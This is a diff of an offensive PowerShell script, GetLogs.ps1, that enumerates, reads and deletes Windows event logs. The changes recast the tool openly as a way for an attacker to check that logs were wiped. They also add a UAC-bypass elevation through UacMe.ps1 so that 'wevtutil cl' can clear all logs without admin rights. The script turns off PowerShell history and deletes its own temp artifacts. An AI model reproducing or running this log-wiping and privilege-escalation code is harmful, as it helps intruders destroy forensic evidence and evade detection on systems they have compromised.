@@ -1,27 +1,27 @@
 ﻿<#
 .SYNOPSIS
-   Enumerate\Read\Clear eventvwr logfiles!
+   Enumerate\Read\DeleteAll eventvwr logfiles!
 
    Author: r00t-3xp10it
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
-   Optional Dependencies: wevtutil
-   PS cmdlet Dev version: v1.5.16
+   Optional Dependencies: wevtutil, UacMe.ps1
+   PS cmdlet Dev version: v1.5.17
 
 .DESCRIPTION
-   This cmdlet displays a list of ALL eventvwr categorie entrys and there
-   indevidual logfiles counter, it also list logfiles on categories sutch as:
-   'Windows Powershell', 'PowerShell/Operational', 'Bits-Client/Operacional'
-   on -GetLogs "verbose" mode, and displays the contents of logfiles based
-   on there ID number if sellected -GetLogs "Yara" parameter @argument!
+   This cmdlet allow users to delete ALL eventvwr logfiles or to delete
+   all of the logfiles from the sellected categorie { -verb 'event path' }.
+   It also enumerates major categories logfiles counter { -GetLogs 'Enum' }
+   to help attacker identify if the logs have been successfuly deleted. To
+   further forensics investigation we can use the { -GetLogs 'yara' } @arg
+   that allow users to display the contents of the sellected logfiles.
 
 .NOTES
    Required Dependencies: wevtutil {native}
-   The Clear @argument requires administrator privileges!
    To list multiple Id's then split the numbers by a [,] char!
    Example: .\GetLogs.ps1 -GetLogs Yara -Id "59,60,300,400,8002"
-   If none ID or VERB paramets are used together with 'YARA' @argument,
-   then this cmdlet will scan pre-defined event paths and ID's numbers!
+   If none -ID or -VERB paramets are used together with 'YARA' @argument,
+   then this cmdlet will start scan pre-defined event paths and ID's numbers!
 
 .Parameter GetLogs
    Accepts arguments: Enum, Verbose, Yara, DeleteAll
@@ -30,10 +30,10 @@
    How many event logs to display int value (default: 3)
 
 .Parameter Id
-   List logfiles by is EventID number
+   List logfiles by is EventID number identifier!
 
 .Parameter Verb
-   Accepts 'ONE' Eventvwr registry path to be scanned!
+   Accepts 'ONE' Eventvwr path to be scanned\Deleted!
 
 .EXAMPLE
    PS C:\> Get-Help .\GetLogs.ps1 -full
@@ -69,11 +69,11 @@
 
 .EXAMPLE
    PS C:\> .\GetLogs.ps1 -GetLogs DeleteAll
-   Remark: Clear function requires Administrator privileges!
+   Delete ALL eventvwr (categories) logs from snapIn!
 
 .EXAMPLE
    PS C:\> .\GetLogs.ps1 -GetLogs DeleteAll -Verb "Microsoft-Windows-Powershell/Operational"
-   Delete only logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
+   Delete ONLY logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
 
 .INPUTS
    None. You cannot pipe objects to GetLogs.ps1
@@ -110,7 +110,6 @@
 Write-Host ""
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
-Write-Host "`nPlease Wait, Scanning Eventvwr registry! .." -ForegroundColor Green;Start-Sleep -Milliseconds 700
 $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 
 
@@ -119,17 +118,17 @@ If($GetLogs -ieq "Enum"){
    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Lists ALL eventvwr categorie entrys!
+      Helper - List Major eventvwr categorie entrys!
 
    .DESCRIPTION
-      List ALL categorie logs and respective number of entrys!
+      List Major categorie logs and respective number of entrys!
 
    .Parameter GetLogs
       Accepts argument: Enum
 
    .EXAMPLE
       PS C:\> .\GetLogs.ps1 -GetLogs Enum
-      Lists ALL eventvwr categorie entrys
+      Lists Major eventvwr categorie entrys
 
    .OUTPUTS
       LogMode  MaximumSizeInBytes RecordCount LogName
@@ -145,7 +144,7 @@ If($GetLogs -ieq "Enum"){
       Circular            1052672           0 Microsoft-Windows-AppLocker/EXE and DLL
    #>
 
-
+   Write-Host "`nPlease Wait, Scanning Eventvwr registry! .." -ForegroundColor Green;Start-Sleep -Milliseconds 700
    $regex = "system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational"
    ## List Major event logs categories and the number of entries!
    # [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
@@ -165,12 +164,12 @@ If($GetLogs -ieq "Verbose"){
    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - List Powershell \ Application \ System entrys!
+      Helper - List Powershell \ Application \ System entrys verbose!
 
    .DESCRIPTION
-      This function allow users to returm a sellected (-NewEst) number
+      This function allow users to return a sellected (-NewEst) number
       of logfiles on 'Powershell', 'Applications' and 'system' registry
-      Name with 'EventID,EntryType,Source,Message' Propertys displays!
+      categories paths with 'EventID,EntryType,Source,Message' Propertys!
 
    .Parameter GetLogs
       Accepts argument: Verbose
@@ -205,22 +204,25 @@ If($GetLogs -ieq "Verbose"){
           600 Information PowerShell Engine state is changed from Available to Stopped. ... 
    #>
 
-   $regex = "system|application|windows powershell|HardwareEvents|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational"
+   Write-Host "`nPlease Wait, Scanning Eventvwr registry! .." -ForegroundColor Green;Start-Sleep -Milliseconds 700
+   $regex = "system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational"
    ## List Major event logs categories and the number of entries!
    # [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
    Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object {
       $_.LogName -iMatch "($regex)$" } | Format-Table -AutoSize |
          Out-String -Stream | ForEach-Object {
-            $stringformat = If($_ -iMatch '\s+(Windows PowerShell|application|system)\s+'){
+            $stringformat = If($_ -iMatch '\s+(Windows PowerShell|application|system|security)\s+'){
                @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
             Write-Host @stringformat $_
          }
 
    Start-Sleep -Seconds 1
    If($NewEst -lt "1" -or $NewEst -gt "80"){
+
       ## Set the max\min number of logfiles to display!
       Write-Host "[error] Bad -NewEst [$NewEst] input, defaulting to [3] .." -ForegroundColor Red -BackgroundColor Black
       Start-Sleep -Seconds 1;$NewEst = "3"
+
    }
 
    $Categories = @(
@@ -251,13 +253,17 @@ If($GetLogs -ieq "Verbose"){
       $Log = Get-WinEvent -LogName "$Item" -EA SilentlyContinue | Select-Object -First 1
 
       If($? -ieq $False){
+
          Write-Host "$SysLogFile" ## $LASTEXITCODE return $False => NO logs!
          Write-Host "[error] None Eventvwr Entries found under $Item!" -ForegroundColor Red -BackgroundColor Black
+
       }Else{
+
          ## [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
          Write-Host "$SysLogFile" ## $LASTEXITCODE return $True => Logs present!
          Get-WinEvent -LogName "$Item" -EA SilentlyContinue | Select-Object -First $NewEst |
             Select-Object -Property Id,ContainerLog,TimeCreated,ProviderName,Message | Format-Table -AutoSize
+
       }
    }
 
@@ -357,6 +363,9 @@ If($GetLogs -ieq "Yara"){
    # If sellected -verb "Microsoft-Windows-NetworkProfile/Operational" (or other path)
    # then the registry path will be appended to the default $Categories List and scanned!
    # WARNING: Some Eventvwr Registry Paths require administrator privileges to list entrys!
+   Write-Host "`nPlease Wait, Scanning Eventvwr registry! .." -ForegroundColor Green
+
+   Start-Sleep -Milliseconds 700
    If($Verb -ne "False" -and $Verb -Match '/'){
 
       If($Categories -NotContains "$Verb"){
@@ -523,7 +532,6 @@ If($GetLogs -ieq "DeleteAll"){
 
    .NOTES
       Required dependencies: wevtutil {native}
-      Required dependencies: Administrator privs!
       If executed without administrator privileges then it
       uses EOP {@UacMe} technic that elevates shell privileges
       to administrator to be abble to run 'wevtutil cl' cmdline!
@@ -540,10 +548,11 @@ If($GetLogs -ieq "DeleteAll"){
 
    .EXAMPLE
       PS C:\> .\GetLogs.ps1 -GetLogs DeleteAll -Verb "Microsoft-Windows-Powershell/Operational"
-      Delete only logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
+      Delete ONLY logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
    #>
 
-
+   Write-Host "`nPlease Wait, Deleting Eventvwr logfiles! .." -ForegroundColor Green
+   Start-Sleep -Milliseconds 700
    If(-not($IsClientAdmin)){
 
       <#
@@ -590,7 +599,6 @@ If($GetLogs -ieq "DeleteAll"){
       Write-Host "Cleaning ALL '$Env:COMPUTERNAME\$Env:USERNAME' Domain Eventvwr logfiles..";Start-Sleep -Seconds 1
       powershell -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "powershell -File $Env:TMP\$RandomMe.ps1"
 
-
       ## clean all artifacts left behind!
       If(Test-Path -Path "$Env:TMP\$RandomMe.ps1" -EA SilentlyContinue){
          Remove-Item -Path "$Env:TMP\$RandomMe.ps1" -Force      
@@ -598,7 +606,6 @@ If($GetLogs -ieq "DeleteAll"){
       If(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue){
          Remove-Item -Path "$Env:TMP\UacMe.ps1" -Force
       }
-
 
       ## List Major event logs categories and the number of entries!
       # [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
@@ -623,7 +630,7 @@ If($GetLogs -ieq "DeleteAll"){
 
       ## Clear Event Logs
       Write-Host "[i] Shell - administrator privileges: True" -ForegroundColor Yellow
-      Write-Host "[+] Cleaning $Env:COMPUTERNAME\$Env:USERNAME Eventvwr logfiles ...`n" -ForeGroundColor Green
+      Write-Host "[+] Cleaning ALL '$Env:COMPUTERNAME\$Env:USERNAME' Domain Eventvwr logfiles.." -ForeGroundColor Green
       ## wevtutil cl "Microsoft-Windows-Powershell/Operational"  ## Clean Powershell logfiles
       ## wevtutil cl "Microsoft-Windows-Bits-Client/Operational" ## Clean BITS-TRANSFER logfiles
 
